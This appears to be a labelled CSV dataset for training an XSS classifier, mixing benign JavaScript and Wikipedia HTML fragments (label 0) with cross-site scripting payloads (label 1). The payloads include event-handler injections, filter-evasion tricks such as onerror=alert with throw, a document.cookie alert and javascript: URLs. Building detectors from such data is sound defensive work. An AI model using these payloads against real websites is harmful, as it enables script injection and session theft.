payload,label
}; row.push(this.renderday(dayconfig)); if (++r === 7) {,0
"<meta ondblclick=""alert(1)"">test</meta>",1
<script>var{haha:onerror=alert}=0;throw 1</script>,1
"<font draggable=""true"" ondrag=""alert(1)"">test</font>",1
function unique ( array ) { return array.filter(function(a){ return !this[a] ? this[a] = true : false;,0
"return } const link = document.queryselector(`.bd-aside a[href=""${hash}""]`)",0
} var transformx = -totaldeltax; if (this.options.edge === 'right') {,0
".find('li:not(.optgroup)') .each((el) => { el.addeventlistener('click', this._handleoptionclickbound);",0
let tab = $(e.target).closest('li.tab'),0
trigger: 'hover focus' }; const defaulttype$3 = {,0
} this._ishovered = false; };,0
"nextelement.classlist.add(class_name_active$2); activeelement.classlist.remove(class_name_active$2, orderclassname, directionalclassname); this._issliding = false;",0
"<optgroup ondblclick=""alert(1)"">test</optgroup>",1
value: function _setenterdelaytimeout(ismanual) { var _this28 = this; cleartimeout(this._enterdelaytimeout);,0
"<script a=`>` src=""httx://.rocks/.js""></script>",1
"<style>:target {color: red;}</style><select id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></select>",1
"for (const element of selectorengine.getmultipleelementsfromselector(this)) { collapse.getorcreateinstance(element, { toggle: false",0
"this._overlay.addeventlistener('touchmove', this._handleclosedragbound); this._overlay.addeventlistener('touchend', this._handleclosereleasebound); this.el.addeventlistener('touchmove', this._handleclosedragbound);",0
const data = alert.getorcreateinstance(this),0
<content id=x tabindex=1 onbeforeactivate=alert(1)></content>,1
"<listing oncopy=""alert(1)"" contenteditable>test</listing>",1
} _handleoverlayclick() { if (this.options.dismissible) {,0
this.el.m_collapsible = undefined,0
"<div draggable=""true"" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable>drop here</nextid>",1
} this.$active.find('img').each((el) => { anim({,0
"w = n + g.delay, r = g.currenttime, x = g.reversed,",0
<button onpointerup=alert(1)>xss</button>,1
"<frameset onmouseover=""alert(1)"">test</frameset>",1
"})(this, (function (manipulator, index_js) { 'use strict'",0
<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>,1
<shadow onpointerout=alert(1)>xss</shadow>,1
"<command onbeforecopy=""alert(1)"" contenteditable>test</command>",1
"function teststep ( parsed, entry ) {",0
"const observablesection = selectorengine.findone(decodeuri(anchor.hash), this._element) if (isvisible(observablesection)) { this._targetlinks.set(decodeuri(anchor.hash), anchor)",0
"<body onclick=""alert(1)"">test</body>",1
"this._tabscarousel.set(this.index, () => {",0
throw new error('slider was already initialized.'); } addslider(scope_target);,0
"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;597–600 </li> </ul>",0
"<article onkeydown=""alert(1)"" contenteditable>test</article>",1
function iselement(node) {,0
"<spacer onmousemove=""alert(1)"">test</spacer>",1
"<content onkeypress=""alert(1)"" contenteditable>test</content>",1
"<ruby draggable=""true"" ondrag=""alert(1)"">test</ruby>",1
"<dd><a href=""/en/1.1/"">1.1</a></dd>",0
"<element oncontextmenu=""alert(1)"">test</element>",1
<strong id=x tabindex=1 ondeactivate=alert(1)></strong><input id=y autofocus>,1
dd: function () { var d = _this56.date.getdate(); return (d < 10 ? '0' : '') + d;,0
"<style>:target {color:red;}</style><data id=x style=""transition:color 1s"" ontransitionend=alert(1)></data>",1
<samp onpointermove=alert(1)>xss</samp>,1
"const selector_data_toggle$3 = '[data-bs-toggle=""dropdown""]:not(.disabled):not(:disabled)'; const selector_data_toggle_shown = `${selector_data_toggle$3}.${class_name_show$6}`; const selector_menu = '.dropdown-menu';",0
if (scrolledx + bounding.width > containerrect.right - offset || scrolledx + bounding.width > window.innerwidth - offset) { edges.right = true; },0
"<output onkeydown=""alert(1)"" contenteditable>test</output>",1
"'sass/components/_cards.scss', 'sass/components/_carousel.scss', 'sass/components/_chips.scss',",0
"<embed draggable=""true"" ondragend=""alert(1)"">test</embed>",1
<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>,1
html: function (content) {,0
"<a href=""javascript:x='&percnt;27-alert(1)-%27';"">xss</a>",1
"super(slider, el, options)",0
value: function getinstance(el) { var domelem = !!el.jquery ? el[0] : el; return domelem.m_floatingactionbutton;,0
"<shadow onbeforecopy=""alert(1)"" contenteditable>test</shadow>",1
<section onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></section>,1
<textarea onbeforepaste=alert(1) autofocus></textarea>,1
"}; } function testtooltips ( parsed, entry ) {",0
if (getnodename(element) === 'html') {,0
"<div role=""note"" class=""hatnote navigation-not-searchable"">main article: <a href=""/wiki/artificial_intelligence_in_healthcare"" title=""artificial intelligence in healthcare"">artificial intelligence in healthcare </a> </div>",0
"<svg onpaste=""alert(1)"" contenteditable>test</svg>",1
"}; const default = { interval: 5000,",0
<* contenteditable onbeforeinput=alert(1)>test,1
return ((iselement(element) ? element.ownerdocument : // $flowfixme[prop-missing],0
} modifiers.foreach(function (modifier) { if (!visited.has(modifier.name)) {,0
$(text_area_selector).each(function() {,0
} if (positionoption) { attributeoptions.position = positionoption;,0
"this.el.removeeventlistener('change', this._handleselectchangebound)",0
"return checks.slice(0, _i).every(function (check) {",0
"static _settostartofday(date) { if (datepicker._isdate(date)) date.sethours(0, 0, 0, 0); }",0
if (!userscrollsdown && !entryislowerthanprevious) {,0
"</span> <span class=""reference-text"">",0
}).join(' '); } return navigator.useragent;,0
"<img src=""jav ascript:alert('');"">",1
"<h3 id=""p-wikibase-otherprojects-label"">",0
const event_keydown = `keydown${event_key}`; const event_load_data_api = `load${event_key}`; const arrow_left_key = 'arrowleft';,0
const arrow_left_key = 'arrowleft',0
"<input onmousemove=""alert(1)"">test</input>",1
var scrolltop = container.scrolltop,0
"</span> <span class=""reference-text""><cite class=""citation web"">clark, jack. <a rel=""nofollow"" class=""external text"" href=""https://www.bloomberg.com/news/articles/2015-07-01/musk-backed-group-probes-risks-behind-artificial-intelligence"">""musk-backed group probes risks behind artificial intelligence"" </a>. <i>bloomberg.com </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20151030202356/http://www.bloomberg.com/news/articles/2015-07-01/musk-backed-group-probes-risks-behind-artificial-intelligence"">archived </a> from the original on 30 october 2015<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 october",0
<script>{onerror=alert}throw 1</script>,1
"var proposals = locations.slice(); var b = [!upward, upward]; var f = [upward, !upward];",0
"<span onmouseleave=""alert(1)"">test</span>",1
"<style>:target {transform: rotate(180deg);}</style><source id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></source>",1
"<audio onkeyup=""alert(1)"" contenteditable>test</audio>",1
return this._element.closest(selector_navbar) !== null; } _getoffset() {,0
"<colgroup onmousedown=""alert(1)"">test</colgroup>",1
<script onreadystatechange=alert(1)></script>,1
<frameset onpointerup=alert(1)>xss</frameset>,1
"<b draggable=""true"" ondragend=""alert(1)"">test</b>",1
"<label onmouseup=""alert(1)"">test</label>",1
<svg><meta onload=alert(1)></meta>,1
index_js.execute(this._config.clickcallback); }); this._isappended = true;,0
} else { ztranslation = this.options.dist * (i * 2 + tween * dir); tweenedopacity = 1 - numvisibleoffset * (i * 2 + tween * dir);,0
<svg><noscript onload=alert(1)></noscript>,1
"var n = .5 > f ? f * (1 + b) : f + b - f * b,",0
} this._element.classlist.remove(class_name_show) const isanimated = this._element.classlist.contains(class_name_fade),0
"selector = selector.replace(/#([^\s""#']+)/g, (match, id) => `#${css.escape(id)}`); } return selector;",0
"var moveevent = attachevent(actions.move, document.documentelement, eventmove, { startcalcpoint: event.calcpoint, basesize: basesize(),",0
} }); return handlenumber;,0
"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",1
"<p onmousemove=""alert(1)"">test</p>",1
"return new backdrop({ classname: class_name_backdrop, isvisible,",0
_this62._autoscrollbound = _this62._autoscroll.bind(_this62); _this62._trackbound = _this62._track.bind(_this62); if (_this62.options.fullwidth) {,0
"this._renderdropdown(data, val)",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><slot id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></slot>",1
"<multicol oncopy=""alert(1)"" contenteditable>test</multicol>",1
let numvisibleoffset = 1 / this.options.numvisible,0
"_completehide(relatedtarget) { const hideevent = eventhandler.trigger(this._element, event_hide, relatedtarget) if (hideevent.defaultprevented) {",0
}; this._element.classlist.remove(class_name_hide); // @deprecated index_js.reflow(this._element);,0
"}"">${this.options.i18n.clear}</button>` ) .appendto(this.footer)",0
"<form draggable=""true"" ondragleave=""alert(1)"">test</form>",1
"<acronym oncopy=""alert(1)"" contenteditable>test</acronym>",1
"<rp draggable=""true"" ondragenter=""alert(1)"">test</rp>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></del>",1
"eventhandler.trigger(this._element, event_hide_prevented); }); }",0
"<ul><li><a href=""/wiki/allen_institute_for_artificial_intelligence"" class=""mw-redirect"" title=""allen institute for artificial intelligence"">allen institute for artificial intelligence </a> </li>",0
"<tbody draggable=""true"" ondragleave=""alert(1)"">test</tbody>",1
"<output onbeforecut=""alert(1)"" contenteditable>test</output>",1
"<a href=# onclick=""window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')"">xss</a>",1
"key: ""updatecounter"", value: function updatecounter() { var maxlength = +this.$el.attr('data-length'),",0
"<video><track default onload=alert(1) src=""data:text/vtt,webvtt""></video>",1
"<table draggable=""true"" ondrag=""alert(1)"">test</table>",1
"<a href=""#"" class=""icon icon-home""> scrapy",0
"}) } document.queryselectorall('.carousel:not([data-bs-ride=""carousel""])')",0
const handler = ({ target }) => {,0
if (!chips._keydown) {,0
"<multicol onbeforecut=""alert(1)"" contenteditable>test</multicol>",1
"<iframe ondblclick=""alert(1)"">test</iframe>",1
for (const anchor of targetlinks) {,0
return; } if (index_js.iselement(content)) {,0
"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationend=""alert(1)""></cite>",1
"</span> <span class=""reference-text""><cite class=""citation news"">knight, will (2017). <a rel=""nofollow"" class=""external text"" href=""https://www.technologyreview.com/s/608871/finally-a-driverless-car-with-some-common-sense/"">""boston may be famous for bad drivers, but it's the testing ground for a smarter self-driving car"" </a>. <i>mit technology review </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">27 march",0
this.xmovement = this.options.transitionmovement,0
}); } // eslint-disable-next-line import/no-unused-modules const hide$1 = {,0
if (this._popper) { this._popper.destroy() },0
"<li id=""cite_note-embodied_ai-167""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-embodied_ai_167-0"">^ </a> </b>",0
"<tt oncopy=""alert(1)"" contenteditable>test</tt>",1
<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,1
return domelem.m_sidenav; } destroy() {,0
static _handlewindowresize() { for (let i = 0; i < parallax._parallaxes.length; i++) { let parallaxinstance = parallax._parallaxes[i];,0
"_this23.options.onshow.call(_this23, _this23.$content[0]); } });",0
<svg><i onload=alert(1)></i>,1
if (this._isshown || this._istransitioning) {,0
"<td ondblclick=""alert(1)"">test</td>",1
"<li id=""cite_note-367""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-367"">^ </a> </b>",0
h.str(a) && (a = e(a) || a),0
<picture onpointerout=alert(1)>xss</picture>,1
"<ul><li><a href=""#citerefacm1998"">acm 1998 </a>, i.2.7 </li>",0
<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>,1
execute(this._config.clickcallback),0
"<bdi onmousemove=""alert(1)"">test</bdi>",1
} _getcontent() { return this._resolvepossiblefunction(this._config.content),0
let istop = origintop <= centery,0
var $toast = $(e.target).closest('.toast'); var toast = $toast[0].m_toast; toast.panning = true;,0
<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,1
}); }; const slideevent = triggerevent(event_slide);,0
"anim({ targets: $body[0], height: finalheight,",0
"<li><a href=""/wiki/computational_social_science"" title=""computational social science"">computational social science </a> </li>",0
_this20.$photocaption.remove(); } });,0
"const showevent = eventhandler.trigger(this._element, this.constructor.eventname(event_show$2)); const shadowroot = findshadowroot(this._element); const isinthedom = (shadowroot || this._element.ownerdocument.documentelement).contains(this._element);",0
<head onpointerleave=alert(1)>xss</head>,1
this.focusedindex < this.dropdownel.children.length &&,0
"var value = getvalue(el); if (value !== null) { query += encode(name, value);",0
value: function _setcarouselheight(imageonly) { var _this65 = this; var firstslide = this.$el.find('.carousel-item.active').length ? this.$el.find('.carousel-item.active').first() : this.$el.find('.carousel-item').first();,0
"<style>:target {transform: rotate(180deg);}</style><template id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></template>",1
"for (const element of triggerarray) { element.classlist.toggle(class_name_collapsed, !isopen); element.setattribute('aria-expanded', isopen);",0
return $jscomp.arrayiterator(this); } });$jscomp.initsymboliterator = function () {}; };$jscomp.arrayiterator = function (e) {,0
<base onpointerup=alert(1)>xss</base>,1
if ( data.hover && e.buttons ) {,0
return this; } var comparator = isfunction(selector) ? selector : getcomparefunction(selector);,0
<body onpageshow=alert(1)>,1
"<del draggable=""true"" ondragleave=""alert(1)"">test</del>",1
"<ul draggable=""true"" ondrag=""alert(1)"">test</ul>",1
var previndex = this.index,0
"<source onkeyup=""alert(1)"" contenteditable>test</source>",1
return } this._isshown = false,0
"}, { key: ""_setsliderheight"", value: function _setsliderheight() {",0
<element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>,1
"<style>@keyframes x{}</style><option style=""animation-name:x"" onanimationstart=""alert(1)""></option>",1
"this._resetelementattributes(selector_fixed_content, property_padding)",0
"}); eventhandler.on(window, event_resize$1, () => { if (this._isshown && !this._istransitioning) {",0
"<menuitem onkeydown=""alert(1)"" contenteditable>test</menuitem>",1
"<ol draggable=""true"" ondrag=""alert(1)"">test</ol>",1
"setdataattribute(element, key, value) {",0
"<div class=""thumbinner"" style=""width:222px;""><a href=""/wiki/file:particleswarmarrowsanimation.gif"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/e/ec/particleswarmarrowsanimation.gif/220px-particleswarmarrowsanimation.gif"" decoding=""async"" width=""220"" height=""165"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/e/ec/particleswarmarrowsanimation.gif/330px-particleswarmarrowsanimation.gif 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/e/ec/particleswarmarrowsanimation.gif/440px-particleswarmarrowsanimation.gif 2x"" data-file-width=""560"" data-file-height=""420"" /> </a> <div class=""thumbcaption"">",0
<script>'alert\x281\x29'instanceof{[symbol['hasinstance']]:eval}</script>,1
"} function pips ( grid ) { var mode = grid.mode,",0
"} const defaulttype = { offset: '(number|null)', // todo v6 @deprecated, keep it for backwards compatibility reasons",0
"} each([""width"", ""height""], function (v) { var lower = v.tolowercase();",0
} disable() { this._isenabled = false,0
"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationstart=""alert(1)""></dl>",1
<dir id=x tabindex=1 onfocus=alert(1)></dir>,1
"const clickevent = `click.dismiss${component.event_key}` const name = component.name eventhandler.on(document, clickevent, `[data-bs-dismiss=""${name}""]`, function (event) {",0
"<picture oncopy=""alert(1)"" contenteditable>test</picture>",1
"<spacer onmouseout=""alert(1)"">test</spacer>",1
<kbd onpointerout=alert(1)>xss</kbd>,1
"<listing onbeforecut=""alert(1)"" contenteditable>test</listing>",1
"<plaintext onmousedown=""alert(1)"">test</plaintext>",1
const event_slide = `slide${event_key$8}`,0
"find(selector, context))",0
"<style>:target {color: red;}</style><element id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></element>",1
"</span>"" </a>. <i>bbc news </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20170126133849/http://www.bbc.co.uk/news/health-38717928"">archived </a> from the original on 26 january 2017<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">26 january",0
} static get defaulttype() { return defaulttype;,0
"</span>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3abook&amp;rft.genre=unknown&amp;rft.btitle=a+proposal+for+the+dartmouth+summer+research+project+on+artificial+intelligence&amp;rft.date=1955&amp;rft.aulast=mccarthy&amp;rft.aufirst=john&amp;rft.au=minsky%2c+marvin&amp;rft.au=rochester%2c+nathan&amp;rft.au=shannon%2c+claude&amp;rft_id=http%3a%2f%2fwww-formal.stanford.edu%2fjmc%2fhistory%2fdartmouth%2fdartmouth.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
return window; } return offsetparent || getcontainingblock(element) || window;,0
"tick.css({ left: this.options.dialradius + math.sin(radian) * radius - this.options.tickradius + 'px',",0
"m.initializejquerywrapper(sidenav, 'sidenav', 'm_sidenav'); } })(cash, m.anime);",0
let taptargetwavewidth = originwidth > originheight ? originwidth * 2 : originwidth * 2,0
"const applystyles$1 = { name: 'applystyles', enabled: true,",0
return; } if (!this.isdragged) {,0
const event_click_data_api = `click${event_key}${data_api_key}`; const class_name_carousel = 'carousel'; const class_name_active = 'active';,0
"eventhandler.on(this._element, event_keydown_dismiss, event => {",0
if ('ontouchstart' in window) {,0
setstoredtheme(theme),0
if (!toastplacement.dataset.originalclass) {,0
"const defaulttype$b = { interval: '(number|boolean)', keyboard: 'boolean',",0
value: function _setupinput() { this.$input = this.$el.find('input'); if (!this.$input.length) {,0
"<frame onclick=""alert(1)"">test</frame>",1
"<shadow onmousedown=""alert(1)"">test</shadow>",1
"<style>:target {color: red;}</style><article id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></article>",1
<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>,1
} } waves.displayeffect = function(options) {,0
"<address onmouseout=""alert(1)"">test</address>",1
"<div onkeydown=""alert(1)"" contenteditable>test</div>",1
<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>,1
"...defaultbspopperconfig, ...index_js.execute(this._config.popperconfig, [undefined, defaultbspopperconfig]) };",0
".on('click', this.done.bind(this))",0
".css({ float: 'right', 'font-size': '12px',",0
if (element.classlist.contains('disabled')) {,0
} _initializebackdrop() { return new backdrop({,0
package.onuse(function (api) {,0
"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationstart=""alert(1)""></input>",1
var heightpercent = this.originalheight / this.windowheight; this.newwidth = 0; this.newheight = 0;,0
body: 'pickers provide a simple way to select a date or time.' }); window.index.add({,0
static get default() { return default$5; },0
"el.removeeventlistener('click', _this42._handleindicatorclickbound)",0
var diff = this._wrap(this.center) - clickedindex; if (diff !== 0) { e.preventdefault();,0
"} _applymanipulationcallback(selector, callback) { if (index_js.iselement(selector)) {",0
"<rtc oncontextmenu=""alert(1)"">test</rtc>",1
"if (hasclass(v, c)) { removeclass(v, c); } else {",0
"} function setvalue ( to, handlenumber ) { if ( to === null || to === false ) {",0
"eventhandler.on(this._element, event_focusout, event => this._oninteraction(event, false)); } _cleartimeout() {",0
const preventoverflow$1 = {,0
<bgsound onpointermove=alert(1)>xss</bgsound>,1
this._animateout(); return this; },0
this.$el.append(chipel),0
scrollspy._elements.push(_this35),0
return object.keys(merged).map(function (key) { return merged[key]; });,0
"} }); document.addeventlistener('focus', function (e) {",0
this._completehide(relatedtarget) } dispose() {,0
"<video oncontextmenu=""alert(1)"">test</video>",1
"<spacer onmousedown=""alert(1)"">test</spacer>",1
const event_keydown_data_api = `keydown${event_key}${data_api_key}` const event_keyup_data_api = `keyup${event_key}${data_api_key}` const class_name_show = 'show',0
"href: 'http://materializecss.com/feature-discovery.html',",0
"<code onbeforecopy=""alert(1)"" contenteditable>test</code>",1
if (!arguments.length) {,0
"<area oncontextmenu=""alert(1)"">test</area>",1
"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>",1
"})(window); if (typeof define === 'function' && define.amd) { define('m', [], function() {",0
"element.classlist.toggle(class_name_collapsed, !isopen) element.setattribute('aria-expanded', isopen) }",0
"$jscomp.defineproperty = ""function"" == typeof object.defineproperties ? object.defineproperty : function (e, r, p) {",0
"'transition-duration': effect.duration + 'ms',",0
} else if ((e.which === m.keys.arrow_down || e.which === m.keys.arrow_up) && this.isopen) { e.preventdefault(); var direction = e.which === m.keys.arrow_down ? 1 : -1;,0
<ol id=x tabindex=1 onactivate=alert(1)></ol>,1
"this.options.onselect.call(this, this.date)",0
"<summary onbeforepaste=""alert(1)"" contenteditable>test</summary>",1
"}); }, text: function (content) {",0
"typeof define === 'function' && define.amd ? define(['./base-component', './dom/event-handler', './util/index'], factory) :",0
return; } if (this._config.backdrop === 'static') {,0
<main onpointerup=alert(1)>xss</main>,1
"<keygen onmousemove=""alert(1)"">test</keygen>",1
"key: ""init"", value: function init(els, options) { return _get(pushpin.__proto__ || object.getprototypeof(pushpin), ""init"", this).call(this, this, els, options);",0
"}, rgb: function (a) { return (/^rgb/.test(a) );",0
"<style>@keyframes slidein {}</style><meter style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></meter>",1
return } const themeswitchertext = document.queryselector('#bd-theme-text'),0
"<col oncut=""alert(1)"" contenteditable>test</col>",1
"<abbr onbeforepaste=""alert(1)"" contenteditable>test</abbr>",1
if (selectindex < 0) { return; },0
for (var i = 0; i < this.chipsdata.length; i++) { var chipel = this._renderchip(this.chipsdata[i]); this.$el.append(chipel);,0
"<div draggable=""true"" contenteditable>drag me</div><content ondrop=alert(1) contenteditable>drop here</content>",1
val: function (value) {,0
<thead onpointerout=alert(1)>xss</thead>,1
"rendertable(opts, data, randid) { return ( '<div class=""datepicker-table-wrapper""><table cellpadding=""0"" cellspacing=""0"" class=""datepicker-table"" role=""grid"" aria-labelledby=""' +",0
"this.$activetablink.addclass('active'); let previndex = this.index; this.index = math.max(this.$tablinks.index(tablink), 0);",0
"datatype: 'json', success: function(data) { var sha = data.sha,",0
"<select draggable=""true"" ondragenter=""alert(1)"">test</select>",1
this._removeeventhandlers(); this._enablebodyscrolling(); this._overlay.parentnode.removechild(this._overlay);,0
"this.options.onpositionchange.call(this, 'pin-top'); } }",0
"var multiplecheckbox = this.ismultiple ? ""<label><input type=\""checkbox\"""" + disabledclass + ""\""/><span>"" + option.innerhtml + ""</span></label>"" : option.innerhtml; var liel = $('<li></li>'); var spanel = $('<span></span>');",0
if (!object.keys(storeelementevent).length) {,0
"_emulateanimation(callback) { executeaftertransition(callback, this._getelement(), this._config.isanimated) }",0
if (this.isopen) { this.close(); } else {,0
this[this.currentview] = value,0
var minprop = axis === 'y' ? top : left,0
"prepend: function (content) { insertcontent(this, content, true); return this;",0
"if (scroll) { scrollparents.foreach(function (scrollparent) { scrollparent.removeeventlistener('scroll', instance.update, passive);",0
"<li id=""cite_note-qualification_problem-104""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-qualification_problem_104-0"">^ </a> </b>",0
"<rtc onmousemove=""alert(1)"">test</rtc>",1
"<summary oncopy=""alert(1)"" contenteditable>test</summary>",1
"} _createclass(autocomplete, [{ key: ""destroy"",",0
"var $tick = $('<div class=""timepicker-tick""></div>'); if (this.options.twelvehour) { for (var i = 1; i < 13; i += 1) {",0
"eventhandler.off(document, event_key) // guard against infinite focus loop",0
"<nobr onpaste=""alert(1)"" contenteditable>test</nobr>",1
"selector = hrefattribute && hrefattribute !== '#' ? hrefattribute.trim() : null; } return selector ? selector.split(',').map(sel => parseselector(sel)).join(',') : null;",0
<acronym id=x tabindex=1 onactivate=alert(1)></acronym>,1
this._typecheckconfig(config); return config; },0
"<img """"""><script>alert("""")</script>""\>",1
"api.export('m', 'client')",0
} e.stoppropagation(); },0
"return { stepbefore: { startvalue: this.xval[j-2], step: this.xnumsteps[j-2], higheststep: this.xhighestcompletestep[j-2] }, thisstep: { startvalue: this.xval[j-1], step: this.xnumsteps[j-1], higheststep: this.xhighestcompletestep[j-1] },",0
"<summary onpaste=""alert(1)"" contenteditable>test</summary>",1
"<li><a href=""/wiki/jaan_tallinn"" title=""jaan tallinn"">jaan tallinn </a> </li>",0
</span> </a> </i>&#93; </sup> </li> </ul>,0
"if ( handlenumbers.length > 1 ) { handlenumbers.foreach(function(handlenumber, o) { var to = checkhandleposition(proposals, handlenumber, proposals[handlenumber] + proposal, b[o], f[o]);",0
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionend=alert(1)></object>",1
} }); $('.fixed-action-btn').floatingactionbutton();,0
"}, this.options.exitdelay)",0
"<em draggable=""true"" ondragend=""alert(1)"">test</em>",1
"<li><a href=""/wiki/glossary_of_genetics"" title=""glossary of genetics"">genetics </a> </li>",0
"<style>:target {transform: rotate(180deg);}</style><menuitem id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></menuitem>",1
<img2 onpointerup=alert(1)>xss</img2>,1
"<svg onmousemove=""alert(1)"">test</svg>",1
"<ul><li><a href=""/wiki/evolutionary_computation_(journal)"" title=""evolutionary computation (journal)"">evolutionary computation (journal) </a> </li> </ul>",0
var tickradius = this.options.tickradius; var diameter = dialradius * 2; var svg = timepicker._createsvgel('svg');,0
<html id=x tabindex=1 onfocusin=alert(1)></html>,1
let centery = windowheight / 2,0
jqueryevent.preventdefault(),0
"throw new error(""nouislider: missing 'min' or 'max' in 'range'."")",0
"<blink onmousemove=""alert(1)"">test</blink>",1
"key: ""_updateposition"", value: function _updateposition() { var scrolled = m.getdocumentscrolltop() + this.options.offset;",0
"if (!domcontentloadedcallbacks.length) { document.addeventlistener('domcontentloaded', () => { for (const callback of domcontentloadedcallbacks) {",0
if (object.is(':valid') && haslength && len <= lenattr || object.is(':valid') && !haslength) {,0
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/commands.html"">command line tool</a></li>",0
"const version = '5.3.8' class basecomponent extends config { constructor(element, config) {",0
<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>,1
if (this.doneanimating) {,0
} _iswithcontent() { return boolean(this._gettitle());,0
"\<a onmouseover=""alert(document.cookie)""\>xxs link\</a\>",1
<plaintext id=x tabindex=1 onbeforeactivate=alert(1)></plaintext>,1
"<div draggable=""true"" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>",1
} else { _this53.gotodate(defdate); },0
"}); })(cash, m.anime); ;(function ($) {",0
"<textarea onmouseover=""alert(1)"">test</textarea>",1
} function updateconnect ( index ) { if ( !scope_connects[index] ) {,0
"https://portswigger-labs.net/xss/xss.php?x=%3cinput%20onfocus=%22attributes[0].value=id%2burl%2bid,new%20onfocus%22%20id=%60%20autofocus%3e",1
_this57._inserthtmlintodom(); _this57._setupmodal(); _this57._setupvariables();,0
"$(document).on('reset', function (e) { var formreset = $(e.target); if (formreset.is('form')) {",0
"<textarea onmousedown=""alert(1)"">test</textarea>",1
this.$el[0].m_parallax = undefined; } static _handlescroll() {,0
"<ul onkeyup=""alert(1)"" contenteditable>test</ul>",1
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,1
"for (const [selector, text] of object.entries(this._config.content)) { this._setcontent(templatewrapper, text, selector); }",0
<frameset onpointerleave=alert(1)>xss</frameset>,1
"<dialog onclick=""alert(1)"">test</dialog>",1
classes = $(this).attr('class'); $(this).html('<span>' + rgb2hex(color) + ' ' + classes + '</span>'); if (classes.indexof('darken') >= 0 || $(this).hasclass('black')) {,0
"<multicol draggable=""true"" ondragenter=""alert(1)"">test</multicol>",1
"<html draggable=""true"" ondragstart=""alert(1)"">test</html>",1
static getinstance(el) { let domelem = !!el.jquery ? el[0] : el; return domelem.m_tabs;,0
